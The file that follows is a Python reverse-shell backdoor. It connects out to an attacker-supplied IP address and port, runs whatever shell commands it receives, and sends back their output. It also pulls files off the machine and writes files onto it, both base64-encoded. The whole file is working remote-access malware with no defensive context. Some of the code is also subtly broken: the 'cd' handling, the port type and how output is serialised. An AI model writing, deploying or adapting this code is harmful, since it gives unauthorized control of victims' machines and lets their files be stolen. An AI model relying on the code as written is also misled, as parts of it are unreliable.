import socket
import simplejson
import os
import base64
import subprocess
import optparse


def get_user_input():
    opts = optparse.OptionParser()
    opts.add_option("-i", "--ip", dest="ip", help="IP Address")
    opts.add_option("-p", "--port", dest="port", help="Port")
    inputs = opts.parse_args()[0]
    return inputs


class Socket:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                return simplejson.loads(data)
            except ValueError:
                continue

    def command_execute(self, command):
        return subprocess.check_output(command, shell=True)

    def get_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def save_file(self, path, data):
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))
            return "Download successful"

    def cd_exec(self, directory):
        os.chdir(directory)
        return self.command_execute("cd " + directory)

    def start_server(self):
        while True:
            command = self.json_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.command_execute(command[1])

                elif command[0] == "download":
                    command_output = self.get_file(command[1])

                elif command[0] == "upload":
                    command_output = self.save_file(command[1], command[2])

                else:
                    command_output = self.command_execute(command)

            except Exception:
                command_output = "Error"

            self.json_send(command_output)

        self.connection.close()


user_input = get_user_input()
socket_obj = Socket(user_input.ip, user_input.port)
socket_obj.start_server()
